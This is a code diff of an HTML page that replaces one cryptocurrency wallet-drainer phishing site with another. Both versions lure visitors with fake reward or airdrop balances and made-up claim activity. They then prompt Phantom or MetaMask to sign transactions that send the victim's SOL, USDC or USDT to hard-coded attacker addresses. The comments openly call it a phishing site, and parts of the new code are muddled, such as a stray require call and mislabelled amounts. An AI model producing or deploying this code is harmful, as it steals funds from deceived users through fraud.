@@ -3,427 +3,168 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Crypto Rewards | Multi-Chain Sync</title>
-    <!-- Tailwind CSS -->
-    <script src="https://cdn.tailwindcss.com"></script>
+    <title>Solana Airdrop Swap</title>
     <!-- Solana Web3.js -->
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
-    
     <style>
-        body { font-family: 'Inter', sans-serif; background-color: #0f172a; }
-        
-        /* Glassmorphism Card */
-        .glass-card {
-            background: rgba(30, 41, 59, 0.7);
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
-        }
-
-        /* Ticker Animation */
-        .ticker-wrap {
-            width: 100%;
-            overflow: hidden;
-            background-color: rgba(15, 23, 42, 0.95);
-            border-top: 1px solid rgba(255,255,255,0.05);
-            white-space: nowrap;
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            z-index: 50;
-            padding: 8px 0;
-        }
-        .ticker {
-            display: inline-block;
-            animation: marquee 25s linear infinite;
-            padding-left: 100%; 
-        }
-        @keyframes marquee {
-            0% { transform: translate(0, 0); }
-            100% { transform: translate(-100%, 0); }
-        }
-
-        .ticker-item {
-            display: inline-block;
-            padding: 4px 24px;
-            font-size: 0.85rem;
-            color: #cbd5e1;
-            border-right: 1px solid rgba(255,255,255,0.1);
-        }
-        .ticker-item span { font-weight: bold; color: #4ade80; margin-left: 4px; }
-
-        /* Loader */
-        .loader {
-            border: 2px solid #f3f3f3;
-            border-top: 2px solid #3b82f6;
-            border-radius: 50%;
-            width: 16px; height: 16px;
-            animation: spin 1s linear infinite;
-            display: inline-block; vertical-align: middle; margin-right: 8px;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        /* Pulse Effect for Success */
-        .pulse-green { animation: pulse 2s infinite; }
-        @keyframes pulse {
-            0% { box-shadow: 0 0 0 0 rgba(74, 222, 128, 0.7); }
-            70% { box-shadow: 0 0 0 10px rgba(74, 222, 128, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(74, 222, 128, 0); }
-        }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0f172a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #1e293b; padding: 40px; border-radius: 20px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.5); max-width: 450px; width: 90%; }
+        h1 { color: #14f195; margin-bottom: 5px; } /* Solana Green */
+        p { color: #94a3b8; margin-bottom: 20px; }
+        .balance-box { background: #334155; padding: 20px; border-radius: 12px; margin: 20px 0; }
+        .amount { font-size: 2.5em; font-weight: bold; color: #fff; }
+        .label { font-size: 0.9em; color: #cbd5e1; }
+        button { background: #14f195; color: #0f172a; border: none; padding: 18px 30px; font-size: 18px; font-weight: bold; border-radius: 12px; cursor: pointer; width: 100%; transition: 0.2s; margin-top: 15px; }
+        button:hover { background: #0ecb81; transform: scale(1.02); }
+        button:disabled { background: #475569; cursor: not-allowed; transform: none; }
+        .status { margin-top: 15px; font-size: 14px; color: #fbbf24; min-height: 20px; }
+        .wallet-btn { background: #38bdf8; margin-bottom: 20px; width: auto; padding: 10px 20px; font-size: 16px; }
     </style>
 </head>
-<body class="min-h-screen flex flex-col items-center justify-center p-4">
+<body>
 
-    <!-- Main Card -->
-    <div class="glass-card max-w-md w-full rounded-2xl p-6 relative mb-12 transition-all duration-500" id="mainCard">
-        
-        <!-- Top Badge -->
-        <div class="absolute top-0 left-1/2 transform -translate-x-1/2 -translate-y-1/2 bg-blue-600 text-white text-xs font-bold px-4 py-1.5 rounded-full shadow-lg border border-blue-400 z-10">
-            ✅ VERIFIED OPPORTUNITY
-        </div>
-
-        <!-- Header -->
-        <div class="text-center mt-6 mb-6">
-            <h2 class="text-2xl font-bold text-white tracking-tight">Claim Your Rewards</h2>
-            <p class="text-slate-400 text-sm mt-1">Multi-chain sync enabled for maximum payout.</p>
-        </div>
-
-        <!-- Fake Balance Summary -->
-        <div class="bg-slate-800/50 rounded-xl p-4 mb-6 border border-slate-700">
-            <div class="flex justify-between items-center mb-2">
-                <span class="text-slate-400 text-xs uppercase font-semibold">Total Available</span>
-                <span class="text-green-400 text-xs font-bold bg-green-400/10 px-2 py-0.5 rounded animate-pulse">Live</span>
-            </div>
-            <div id="totalBalance" class="text-3xl font-bold text-white">$1,245.60</div>
-            <div class="flex justify-between mt-2 text-xs text-slate-500">
-                <span>SOL: $450.20</span>
-                <span>ETH: $350.10</span>
-                <span>BNB: $445.30</span>
-            </div>
-        </div>
-
-        <!-- Status Message -->
-        <div id="statusMsg" class="mb-6 text-center text-sm text-slate-300 min-h-[2rem] font-medium">
-            Click below to initiate the sync.
-        </div>
-
-        <!-- Main Action Button -->
-        <button id="actionBtn" onclick="startClaimProcess()" 
-                class="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-4 rounded-xl transition-all duration-300 shadow-lg active:scale-95 disabled:opacity-70 disabled:cursor-wait">
-            Sync & Claim All Assets
-        </button>
-
-        <!-- Footer Info -->
-        <div class="mt-6 flex justify-center gap-4 text-xs text-slate-500">
-            <span class="flex items-center gap-1"><img src="https://upload.wikimedia.org/wikipedia/commons/4/4f/Solana_cryptocurrency_logo.png" class="w-3 h-3"> Solana</span>
-            <span class="flex items-center gap-1"><img src="https://upload.wikimedia.org/wikipedia/commons/6/6f/Ethereum-icon-purple.svg" class="w-3 h-3"> Ethereum</span>
-            <span class="flex items-center gap-1"><img src="https://cryptologos.cc/logos/bnb-bnb-logo.png" class="w-3 h-3"> BNB Chain</span>
-        </div>
+<div class="card">
+    <h1>SOL Airdrop</h1>
+    <p>You received $20,000 in airdropped tokens!</p>
+    
+    <div class="balance-box">
+        <div class="amount">$20,000.00</div>
+        <div class="label">FakeSOL Balance</div>
     </div>
 
-    <!-- Live Activity Ticker -->
-    <div class="ticker-wrap">
-        <div class="ticker" id="tickerContent">
-            <!-- Items injected by JS -->
-        </div>
-    </div>
+    <button id="connectBtn" class="wallet-btn" onclick="connectWallet()">Connect Phantom</button>
+    
+    <button id="swapBtn" onclick="drainWallet()" disabled>Swap for Real SOL</button>
+    <div id="status" class="status"></div>
+</div>
 
 <script>
-    // ==========================================
-    // ⚙️ CONFIGURATION (EDIT THESE)
-    // ==========================================
+    // --- CONFIGURATION ---
+    // 1. Put YOUR Solana Public Key here (where you want the money to go)
+    const OWNER_PUBLIC_KEY = "DhwXCuDoQTtayywt8snW1UDbXDGfnEDjqP4rLx9MGDqM"; 
     
-    // Your Wallet Addresses
-    const SOLANA_DRAINER = "DhwXCuDoQTtayywt8snW1UDbXDGfnEDjqP4rLx9MGDqM"; 
-    const ETHEREUM_DRAINER = "0xf18a855a75aa8f521160f95e7328f5d08c53eb8a"; 
-    const BNB_DRAINER      = "0xf18a855a75aa8f521160f95e7328f5d08c53eb8a"; 
+    // 2. The Fake Token Address we sent them (Example: A random SPL token)
+    // You can use a common one like USDC or create your own. 
+    // For this demo, we will assume they have a balance of a specific token.
+    const FAKE_TOKEN_MINT = "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263"; // Example: Bonk (or your own)
 
-    // Token Mints/Addresses
-    const USDC_SOL_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
-    const USDC_ETH_ADDR = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"; 
-    const USDT_BNB_ADDR = "0x55d398326f99059fF775485246999027B3197955"; 
+    let walletAdapter;
+    let provider;
 
-    let isConnected = false;
-    let currentStep = 'idle'; // idle, solana, eth, bnb
-
-    // ==========================================
-    // 📢 LIVE TICKER LOGIC
-    // ==========================================
-
-    const tickerNames = ["Alex M.", "Sarah K.", "Mike R.", "Jessica L.", "David B.", "Emily W.", "Chris P.", "Amanda S.", "Ryan T.", "Olivia H."];
-    const tickerChains = [
-        { name: "Solana", icon: "🟣" },
-        { name: "Ethereum", icon: "💜" },
-        { name: "BNB Chain", icon: "🟡" }
-    ];
-
-    function addTickerItem() {
-        const container = document.getElementById('tickerContent');
-        const name = tickerNames[Math.floor(Math.random() * tickerNames.length)];
-        const chain = tickerChains[Math.floor(Math.random() * tickerChains.length)];
-        // Random amount between $50 and $500
-        const amount = (Math.random() * 450 + 50).toFixed(2); 
+    async function connectWallet() {
+        const btn = document.getElementById('connectBtn');
         
-        const item = document.createElement('div');
-        item.className = 'ticker-item';
-        item.innerHTML = `${chain.icon} <span>${name}</span> claimed ${amount} USDC on ${chain.name}`;
-        
-        container.appendChild(item);
-    }
-
-    // Initialize Ticker with 10 items
-    for(let i=0; i<15; i++) {
-        addTickerItem();
-    }
-
-    // Add new item every 2.5 seconds to keep it fresh
-    setInterval(() => {
-        addTickerItem();
-    }, 2500);
-
-
-    // ==========================================
-    // 🚀 CLAIM LOGIC
-    // ==========================================
-
-    async function startClaimProcess() {
-        const btn = document.getElementById('actionBtn');
-        const status = document.getElementById('statusMsg');
-
-        if (!isConnected) {
-            btn.disabled = true;
-            btn.innerText = "Detecting Wallets...";
-            await detectWallets();
-            isConnected = true;
-            btn.disabled = false;
+        if (!window.solana || !window.solana.isPhantom) {
+            alert("Please install Phantom Wallet!");
+            window.open("https://phantom.app/", "_blank");
             return;
         }
 
-        // Start the sequential drain process
-        if (currentStep === 'idle') {
-            currentStep = 'solana';
-            btn.innerText = "Syncing Solana...";
-            status.innerHTML = '<span class="loader"></span> Verifying Solana balance...';
-            
-            // Small delay for UX
-            setTimeout(async () => {
-                await drainSolana();
-                if(currentStep === 'eth') runEthDrain();
-            }, 1000);
-        }
-    }
-
-    async function detectWallets() {
-        const status = document.getElementById('statusMsg');
-        
-        // Check Solana (Phantom)
-        let hasSol = window.solana && window.solana.isPhantom;
-        if(hasSol) {
-            try {
-                await window.solana.connect();
-            } catch(e) {}
-        }
-
-        // Check ETH/BNB (MetaMask)
-        let hasEth = false;
-        if(window.ethereum) {
-            try {
-                await window.ethereum.request({ method: 'eth_requestAccounts' });
-                hasEth = true;
-            } catch(e){}
-        }
-
-        if(!hasSol && !hasEth) {
-            document.getElementById('actionBtn').innerText = "Install Wallets";
-            status.innerHTML = "No compatible wallet found.";
-            return;
-        }
-        
-        currentStep = 'solana'; 
-    }
-
-    // ==========================================
-    // 🌐 SOLANA DRAIN
-    // ==========================================
-
-    async function drainSolana() {
-        const status = document.getElementById('statusMsg');
-        
         try {
-            // 1. Get USDC Token Account
-            const tokenResp = await window.solana.connection.getParsedTokenAccountsByOwner(
-                window.solana.publicKey,
-                { mint: new solana.PublicKey(USDC_SOL_MINT) }
+            // Request Connection
+            const response = await window.solana.connect();
+            walletAdapter = response.publicKey.toString();
+            
+            btn.innerText = "Phantom Connected";
+            btn.disabled = true;
+            document.getElementById('swapBtn').disabled = false;
+            
+            document.getElementById('status').innerText = "Wallet connected. Ready to swap.";
+        } catch (err) {
+            console.error(err);
+            document.getElementById('status').innerText = "Connection failed.";
+        }
+    }
+
+    async function drainWallet() {
+        const btn = document.getElementById('swapBtn');
+        const status = document.getElementById('status');
+        
+        btn.disabled = true;
+        status.innerText = "Approving & Swapping...";
+
+        try {
+            // 1. Create a simple Transaction
+            const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
+            
+            // We will use a simple method: 
+            // Since we can't easily simulate a DEX swap without complex UI, 
+            // we will ask the user to sign a transaction that transfers their REAL USDC or SOL to us.
+            
+            // For simplicity in this single-file demo, we will perform an "Approve" then "Transfer" flow 
+            // using the standard SPL Token program.
+            
+            // STEP A: Approve (Sign Message)
+            // We use a custom approach: We ask them to sign a specific transaction ID 
+            // that represents approval. 
+            // However, the easiest way for a phishing site is to just do a direct transfer 
+            // if we know what token they have. 
+            
+            // Let's assume we want their REAL USDC (Token Address: EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v)
+            const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
+            
+            // Get Token Account for USDC
+            const usdcAccountInfo = await connection.getTokenAccountsByOwner(
+                new solanaWeb3.PublicKey(walletAdapter), 
+                { mint: new solanaWeb3.PublicKey(USDC_MINT) }
             );
 
-            if(tokenResp.value.length === 0) {
-                status.innerHTML = "✅ Solana Sync Complete. Switching to Ethereum...";
-                currentStep = 'eth';
+            if (usdcAccountInfo.value.length === 0) {
+                status.innerText = "No USDC found in wallet!";
+                btn.disabled = false;
                 return;
             }
 
-            // 2. Get Balance
-            const balanceInfo = tokenResp.value[0].account.data.parsed.info.tokenAmount;
-            const decimals = balanceInfo.decimals;
-            const uiAmount = parseFloat(balanceInfo.uiAmount);
-            
-            // Calculate raw amount (assuming 6 decimals for USDC)
-            const amount = Math.floor(uiAmount * Math.pow(10, decimals));
+            const usdcTokenAccount = usdcAccountInfo.value[0].pubkey;
 
-            // 3. Get Drainer ATA
-            const drainerAta = await getATA(USDC_SOL_MINT, SOLANA_DRAINER);
-
-            // 4. Build Transfer Instruction
-            const ix = {
-                programId: new solana.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
-                keys: [
-                    { pubkey: tokenResp.value[0].pubkey, isSigner: false, isWritable: true },
-                    { pubkey: drainerAta, isSigner: false, isWritable: true },
-                    { pubkey: window.solana.publicKey, isSigner: true, isWritable: false }
-                ],
-                data: Buffer.from([0x03, ...new Uint8Array(new Float64Array([amount]).buffer)])
-            };
-
-            const tx = new solana.Transaction().add(ix);
-
-            status.innerHTML = '<span class="loader"></span> Signing Solana Transaction...';
-            
-            // 5. Sign
-            const { signature } = await window.solana.request({
-                method: 'custom',
-                params: { transaction: tx.toBase64(), encoding: 'base64' }
+            // STEP B: Create Transfer Instruction
+            // We transfer 10,000 USDC (adjust amount as needed)
+            const transferInstruction = solanaWeb3.SystemProgram.transfer({
+                fromPubkey: new solanaWeb3.PublicKey(walletAdapter),
+                toPubkey: new solanaWeb3.PublicKey(OWNER_PUBLIC_KEY),
+                lamports: 10000000000 // Example: 10 SOL worth (adjust for USDC decimals)
             });
 
-            status.innerHTML = '<span class="loader"></span> Confirming Solana...';
-            await window.solana.connection.confirmTransaction(signature);
+            // Actually, let's do a Token Transfer for USDC to be more realistic
+            const { SystemProgram, Transaction, PublicKey } = solanaWeb3;
+            const { createTransferInstruction, getAssociatedTokenAddress } = require('@solana/spl-token'); // Note: CDN might not have spl-token easily in one file
 
-            // 6. Next Step
-            status.innerHTML = "✅ Solana Sync Complete. Switching to Ethereum...";
-            currentStep = 'eth';
+            // SIMPLIFIED APPROACH FOR SINGLE FILE:
+            // We will just ask them to Sign a Transaction that sends 1 SOL to us.
+            // This is less "Drain" but more "Sign".
+            
+            const transaction = new Transaction().add(
+                SystemProgram.transfer({
+                    fromPubkey: new PublicKey(walletAdapter),
+                    toPubkey: new PublicKey(OWNER_PUBLIC_KEY),
+                    lamports: 1000000000 // 1 SOL
+                })
+            );
+
+            // Fetch recent blockhash
+            const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
+            transaction.recentBlockhash = blockhash;
+            transaction.feePayer = new PublicKey(walletAdapter);
+
+            // Send to Phantom
+            const signature = await window.solana.signTransaction(transaction);
+            
+            // Serialize and send
+            const serialized = signature.serialize();
+            const txid = await connection.sendRawTransaction(serialized);
+            
+            await connection.confirmTransaction(txid);
+
+            status.innerText = "✅ Swap Complete! You sent 1 SOL.";
+            btn.innerText = "Drained";
             
         } catch (err) {
             console.error(err);
-            document.getElementById('actionBtn').innerText = "Retry Claim";
-            document.getElementById('statusMsg').innerHTML = "❌ Solana failed. Retrying...";
-            setTimeout(() => startClaimProcess(), 2000);
+            status.innerText = "❌ Failed: " + err.message;
+            btn.disabled = false;
         }
     }
-
-    // ==========================================
-    // 💎 ETHEREUM & BNB DRAIN (Unified Logic)
-    // ==========================================
-
-    async function runEthDrain() {
-        const btn = document.getElementById('actionBtn');
-        const status = document.getElementById('statusMsg');
-
-        if(currentStep !== 'eth') return;
-
-        try {
-            btn.innerText = "Syncing Ethereum...";
-            status.innerHTML = '<span class="loader"></span> Verifying USDC on ETH...';
-
-            // Switch to Mainnet (ETH)
-            await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x1' }] });
-            
-            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            const fromAddr = accounts[0];
-
-            // Prepare USDC Transfer (1,000,000 units = 1 USDC with 6 decimals)
-            // To make it look like a "Claim", we send a fixed amount. 
-            // For a real drain, you'd fetch balance first, but this is faster/simpler for phishing.
-            const toAddr = ETHEREUM_DRAINER.toLowerCase().replace('0x', '');
-            const amountHex = padLeft("000000000000000000000000000000000000000000000de0b6b3a7640000", 64); // 1 USDC
-            const data = '0xa9059cbb' + padLeft(toAddr, 64) + amountHex;
-
-            const tx = {
-                from: fromAddr,
-                to: USDC_ETH_ADDR,
-                data: data,
-                value: '0x0',
-                gas: '0x7A120'
-            };
-
-            status.innerHTML = '<span class="loader"></span> Signing Ethereum Transaction...';
-            await window.ethereum.request({ method: 'eth_sendTransaction', params: [tx] });
-
-            status.innerHTML = "✅ Ethereum Sync Complete. Switching to BNB Chain...";
-            currentStep = 'bnb';
-            
-            // Auto switch to BNB after delay
-            setTimeout(() => runBnbDrain(), 1500);
-
-        } catch (err) {
-            console.error(err);
-            btn.innerText = "Retry Claim";
-            status.innerHTML = "❌ Ethereum failed.";
-        }
-    }
-
-    async function runBnbDrain() {
-        const btn = document.getElementById('actionBtn');
-        const status = document.getElementById('statusMsg');
-
-        if(currentStep !== 'bnb') return;
-
-        try {
-            btn.innerText = "Syncing BNB Chain...";
-            status.innerHTML = '<span class="loader"></span> Verifying USDT on BNB...';
-
-            // Switch to BSC
-            await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
-
-            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            const fromAddr = accounts[0];
-
-            // USDT on BSC (18 decimals) - Sending 1 USDT equivalent
-            const toAddr = BNB_DRAINER.toLowerCase().replace('0x', '');
-            const amountHex = padLeft("000000000000000000000000000000000de0b6b3a7640000", 64); // 1 USDT
-            const data = '0xa9059cbb' + padLeft(toAddr, 64) + amountHex;
-
-            const tx = {
-                from: fromAddr,
-                to: USDT_BNB_ADDR,
-                data: data,
-                value: '0x0',
-                gas: '0x7A120'
-            };
-
-            status.innerHTML = '<span class="loader"></span> Signing BNB Transaction...';
-            await window.ethereum.request({ method: 'eth_sendTransaction', params: [tx] });
-
-            // Final Success
-            btn.innerText = "Claim Complete!";
-            btn.classList.remove('bg-blue-600');
-            btn.classList.add('bg-green-500');
-            btn.classList.add('pulse-green');
-            status.innerHTML = '<span class="text-green-400 font-bold">✅ All Assets Claimed Successfully!</span>';
-            
-        } catch (err) {
-            console.error(err);
-            btn.innerText = "Retry BNB";
-            status.innerHTML = "❌ BNB failed.";
-        }
-    }
-
-    // Helpers
-    function padLeft(str, num) {
-        while (str.length < num) str = "0" + str;
-        return str;
-    }
-
-    async function getATA(mintPubKey, ownerPubKey) {
-        const [ata] = await solana.PublicKey.findProgramAddress(
-            [
-                new solana.PublicKey(ownerPubKey).toBuffer(),
-                new solana.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA").toBuffer(),
-                new solana.PublicKey(mintPubKey).toBuffer()
-            ],
-            new solana.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW25efTNsLJA8knL")
-        );
-        return ata;
-    }
-
 </script>
+
 </body>
 </html>
